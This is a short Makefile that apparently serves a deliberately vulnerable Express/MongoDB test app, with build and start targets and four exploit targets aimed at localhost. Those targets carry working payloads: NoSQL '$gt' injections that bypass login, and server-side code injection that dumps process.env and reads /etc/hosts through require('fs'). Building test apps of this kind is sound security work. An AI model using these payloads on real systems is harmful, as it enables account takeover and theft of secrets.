package:
	docker build -t tarpit-expressjs-mongodb:latest .

start:
	docker-compose up --build --abort-on-container-exit --remove-orphans 

exploit-login:
	http  --print=HB POST http://localhost:8089/api/v1/login username:='{"$gt": ""}' password:='{"$gt": ""}'

exploit-user-login:
	http  --print=HB POST http://localhost:8089/api/v1/login username:='Mcconnell_Stefanie' password:='{"$gt": ""}'

exploit-env:
	http GET http://localhost:8089/user-input userInput=="process.env"

exploit-read-file:
	http GET http://localhost:8089/user-input userInput=="require(\"fs\").readFileSync('/etc/hosts').toString();"